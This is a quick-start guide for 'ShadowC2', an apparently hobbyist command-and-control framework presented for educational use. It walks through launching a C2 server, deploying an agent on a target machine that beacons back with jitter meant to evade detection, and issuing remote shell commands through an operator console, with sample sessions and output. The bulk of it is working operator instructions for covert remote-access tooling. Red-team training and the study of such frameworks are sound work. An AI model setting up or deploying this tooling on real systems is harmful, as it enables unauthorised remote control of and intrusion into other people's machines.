# ShadowC2 - Quick Start Guide

This guide will help you get ShadowC2 up and running in 5 minutes.

---

## 📋 Prerequisites

- Python 3.8 or higher
- pip (Python package manager)
- Linux (Kali, Ubuntu) or Windows with Python installed

---

## 🚀 Installation

### Step 1: Install Dependencies

```bash
# Navigate to ShadowC2 directory
cd ShadowC2

# Install Python dependencies
pip3 install -r requirements.txt

# Or install individually
pip3 install Flask pycryptodome requests colorama prompt-toolkit
```

### Step 2: Generate Encryption Keys

```bash
# Run the crypto module to generate a key
python3 common/crypto.py
```

**Save the generated PSK (Pre-Shared Key)** - you'll need it for both server and agent.

Example output:
```
Generated PSK: dGhpc2lzYWV4YW1wbGVrZXkxMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcHFy
```

---

## 🖥️ Starting the C2 Server

### Terminal 1: Start C2 Server

```bash
cd ShadowC2/server

# Start server (will generate new key if not provided)
python3 c2_server.py --host 0.0.0.0 --port 8443

# Or with specific key
python3 c2_server.py --host 0.0.0.0 --port 8443 --key YOUR_KEY_HERE
```

**Output:**
```
   _____ __              __              __________ 
  / ___// /_  ____ _____/ /___ _      __/ ____/__ \
  \__ \/ __ \/ __ `/ __  / __ \ | /| / / /     __/ /
 ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / /___  / __/ 
/____/_/ /_/\__,_/\__,_/\____/|__/|__/\____/ /____/ 
                                                     
        Command & Control Framework v1.0
        Educational Use Only - @Akshat

[!] Generated new master key: dGhpc2lzYWV4YW1wbGVrZXkxMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcHFy
[+] C2 Server initialized
    Host: 0.0.0.0
    Port: 8443
    Database: c2_server.db
[+] Database initialized
[+] Starting C2 server on 0.0.0.0:8443
[!] Press Ctrl+C to stop
```

**Copy the master key** shown in the output - you'll need it for the agent.

---

## 🎯 Deploying an Agent

### Terminal 2: Start Agent

```bash
cd ShadowC2/agent

# Start agent (replace with your server IP and key)
python3 agent.py --server https://192.168.1.100:8443 --key YOUR_MASTER_KEY_HERE

# Example:
python3 agent.py --server https://127.0.0.1:8443 --key dGhpc2lzYWV4YW1wbGVrZXkxMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcHFy
```

**Output:**
```
[*] ShadowC2 Agent starting...
[*] Session ID: 550e8400-e29b-41d4-a716-446655440000
[*] C2 Server: https://127.0.0.1:8443
[*] Performing initial check-in...
[+] Check-in successful!
[*] Entering main loop (beacon interval: 60s, jitter: ±30s)
```

---

## 🎮 Operating the C2

### Terminal 3: Operator CLI

```bash
cd ShadowC2/server

# Start operator interface
python3 operator_cli.py
```

**Output:**
```
   _____ __              __              __________ 
  / ___// /_  ____ _____/ /___ _      __/ ____/__ \
  \__ \/ __ \/ __ `/ __  / __ \ | /| / / /     __/ /
 ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / /___  / __/ 
/____/_/ /_/\__,_/\__,_/\____/|__/|__/\____/ /____/ 
        Command & Control Framework v1.0
        Operator Interface

Type 'help' or '?' to list commands.
Type 'sessions' to view active sessions.

ShadowC2> 
```

---

## 📝 Basic Commands

### List Active Sessions

```
ShadowC2> sessions

Active Sessions:
================================================================================
ID  Session ID                              Hostname    Username    OS          
================================================================================
[1] 550e8400-e29b-41d4-a716-446655440000   kali        akshat      Linux 5.15  
================================================================================
Total: 1 session(s)
```

### Interact with a Session

```
ShadowC2> interact 1
[+] Interacting with session 1 (kali)
[*] Type 'back' to return to main menu

(session kali)> 
```

### Execute Commands

```
(session kali)> whoami
[+] Command queued: whoami

(session kali)> shell ls -la
[+] Command queued: shell

(session kali)> pwd
[+] Command queued: pwd

(session kali)> sysinfo
[+] Command queued: sysinfo
```

**Wait for agent to beacon** (default: 60 seconds ± 30 jitter), then check server terminal for output.

### View Stats

```
ShadowC2> stats

C2 Server Statistics:
==================================================
Active Sessions:    1
Total Sessions:     1
Total Commands:     5
Completed Commands: 3
==================================================
```

### View Logs

```
ShadowC2> logs 10

Recent Logs (last 10):
====================================================================================
[2024-02-18 14:32:15] [INFO] Command queued for 550e8400...: whoami
[2024-02-18 14:31:45] [INFO] Response from 550e8400...: akshat
[2024-02-18 14:30:20] [INFO] New session registered: 550e8400... (kali)
====================================================================================
```

---

## 🔧 Common Commands

| Command | Description |
|---------|-------------|
| `sessions` | List all active sessions |
| `interact <n>` | Interact with session number |
| `stats` | Show C2 statistics |
| `logs [n]` | Show recent logs |
| `exit` / `quit` | Exit CLI |

### Session Commands

| Command | Description |
|---------|-------------|
| `whoami` | Current username |
| `hostname` | Get hostname |
| `pwd` | Print working directory |
| `cd <path>` | Change directory |
| `ls [path]` | List directory |
| `shell <cmd>` | Execute shell command |
| `sysinfo` | Get system information |
| `sleep <sec>` | Set beacon interval |
| `exit` | Terminate agent |
| `back` | Return to main menu |

---

## 🧪 Testing Locally

### Test on Same Machine

1. **Start Server:**
   ```bash
   python3 server/c2_server.py --host 127.0.0.1 --port 8443
   ```

2. **Start Agent (different terminal):**
   ```bash
   python3 agent/agent.py --server https://127.0.0.1:8443 --key <KEY_FROM_SERVER>
   ```

3. **Start Operator (different terminal):**
   ```bash
   python3 server/operator_cli.py
   ```

4. **Issue Commands:**
   ```
   ShadowC2> sessions
   ShadowC2> interact 1
   (session)> whoami
   (session)> pwd
   ```

---

## 🌐 Remote Deployment

### Server Setup (Your Kali Machine)

```bash
# Find your IP address
ip addr show

# Start server listening on all interfaces
python3 server/c2_server.py --host 0.0.0.0 --port 8443
```

### Agent Deployment (Target Machine)

1. Copy `agent/agent.py` and `common/` folder to target
2. Install dependencies:
   ```bash
   pip3 install pycryptodome requests
   ```
3. Run agent:
   ```bash
   python3 agent.py --server https://YOUR_KALI_IP:8443 --key YOUR_MASTER_KEY
   ```

---

## 🔒 Security Notes

**⚠️ IMPORTANT:**

- This is for EDUCATIONAL use only
- Only use in authorized lab environments
- Never use against systems without permission
- Traffic is encrypted but server uses self-signed SSL
- Change default passwords/keys in production

---

## 🐛 Troubleshooting

### Agent Can't Connect

```bash
# Check server is running
netstat -tlnp | grep 8443

# Check firewall
sudo ufw status

# Test connection
curl -k https://YOUR_SERVER_IP:8443/health
```

### SSL Certificate Errors

The server uses self-signed certificates. Agents automatically ignore SSL warnings with `verify=False`.

### Database Locked

If you see "database is locked" errors:
```bash
# Close all connections to database
killall python3

# Restart server
python3 server/c2_server.py
```

---

## 📊 Monitoring

### Watch Server Logs

```bash
# Terminal 1: Server running
python3 server/c2_server.py

# Terminal 2: Watch database
watch -n 1 'sqlite3 c2_server.db "SELECT * FROM sessions"'
```

### Check Health

```bash
curl -k https://localhost:8443/health
```

Expected output:
```json
{
  "status": "operational",
  "uptime_seconds": 1234,
  "active_sessions": 1
}
```

---

## 🎓 Next Steps

1. **Test all commands** - Try whoami, shell, sysinfo, etc.
2. **Monitor traffic** - Use Wireshark to see encrypted C2 traffic
3. **Deploy on different machines** - Test remote connections
4. **Customize** - Add new commands to agent
5. **Build dashboard** - Create web UI for operators

---

## 💡 Tips

- **Beacon Interval:** Default is 60s. Change with `sleep <seconds>`
- **Jitter:** Adds randomness to avoid detection patterns
- **Sessions Persist:** Sessions survive agent restarts (same session_id)
- **Command Queue:** Commands execute on next beacon
- **Logs Everything:** Check `c2_server.db` for full history

---

## 🆘 Getting Help

```
ShadowC2> help

Documented commands (type help <topic>):
========================================
exit  help  interact  listeners  logs  quit  sessions  stats
```

---

**You're ready to use ShadowC2! Start experimenting and learning. 🚀**
